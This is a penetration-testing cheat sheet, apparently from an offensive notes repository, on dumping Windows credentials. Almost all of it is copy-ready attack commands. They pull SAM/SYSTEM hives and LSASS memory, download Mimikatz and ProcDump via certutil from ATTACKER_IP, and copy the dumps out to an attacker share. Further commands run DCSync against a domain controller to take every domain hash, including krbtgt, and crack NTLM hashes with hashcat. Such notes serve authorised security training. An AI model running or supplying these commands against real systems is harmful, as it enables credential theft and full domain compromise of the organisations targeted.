# Windows Credential Dumping

**Prerequisites:** Local admin or SYSTEM access from privilege escalation

---

## Local Credentials (SAM/SYSTEM)

### From Remote (Kali)

```bash
# Using NetExec
netexec smb TARGET -u USERNAME -p 'PASSWORD' --sam

# Using secretsdump
impacket-secretsdump DOMAIN/USERNAME:PASSWORD@TARGET
```

### From Local Shell (SYSTEM Required)

```powershell
# Save registry hives
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Transfer to Kali
copy sam.save \\\\ATTACKER_IP\\share\\sam.save
copy system.save \\\\ATTACKER_IP\\share\\system.save
```

```bash
# On Kali: Extract hashes
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

## LSASS Memory Dumping

### Using Mimikatz

```powershell
# Download
certutil -urlcache -f http://ATTACKER_IP/mimikatz.exe mimikatz.exe

# Run
.\mimikatz.exe

# Commands:
privilege::debug
sekurlsa::logonpasswords
exit
```

### Using ProcDump (Stealthier)

```powershell
# Download
certutil -urlcache -f http://ATTACKER_IP/procdump.exe procdump.exe

# Dump LSASS
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Transfer to Kali
copy lsass.dmp \\\\ATTACKER_IP\\share\\lsass.dmp
```

```bash
# On Kali: Parse dump
pypykatz lsa minidump lsass.dmp
```

---

## Domain Credentials (DCSync)

### Requirements

- Domain Admin privileges, OR
- Account with Replicating Directory Changes rights

### Execute DCSync

```bash
# Dump all domain hashes
impacket-secretsdump 'DOMAIN/USERNAME:PASSWORD@DC_IP' -just-dc

# Save to file
impacket-secretsdump 'DOMAIN/USERNAME:PASSWORD@DC_IP' -just-dc -outputfile domain_hashes

# Dump specific users
impacket-secretsdump 'DOMAIN/USERNAME:PASSWORD@DC_IP' -just-dc-user Administrator
impacket-secretsdump 'DOMAIN/USERNAME:PASSWORD@DC_IP' -just-dc-user krbtgt
```

---

## What to Do With Dumped Credentials

**Crack what you can:**
```bash
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Pass-the-hash the rest:**
```bash
# See: 03-POST-EXPLOITATION/lateral-movement.md
```
